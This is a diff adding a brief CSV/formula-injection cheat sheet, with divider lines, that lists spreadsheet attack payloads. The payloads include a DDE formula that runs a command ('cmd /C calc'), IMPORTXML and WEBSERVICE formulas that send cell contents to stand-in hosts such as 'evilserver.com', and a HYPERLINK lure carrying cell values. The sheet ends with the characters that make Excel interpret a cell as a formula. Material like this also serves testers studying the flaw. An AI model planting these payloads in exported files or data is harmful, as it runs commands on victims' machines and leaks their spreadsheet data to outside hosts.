@@ -1,0 +1,14 @@
+----------------------------------------------------------分割线-----------------------------------------------
+=2+5+cmd|' /C calc'!A0
+"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")"
+=HYPERLINK("http://linux.im?test="&A2&A3,"Error: Please click me!")
+=2+5
+=WEBSERVICE(CONCATENATE("http://evilserver.com/evilA...", A2,B2,C2,D2,))
+
+----------------------------------------------------------分割线-----------------------------------------------
+In fact, the following symbols can be used to trigger formula interpretation in Microsoft Excel:
+Equals  to ("=")
+Plus ("+")
+Minus ("-")
+At ("@")
+----------------------------------------------------------分割线-----------------------------------------------
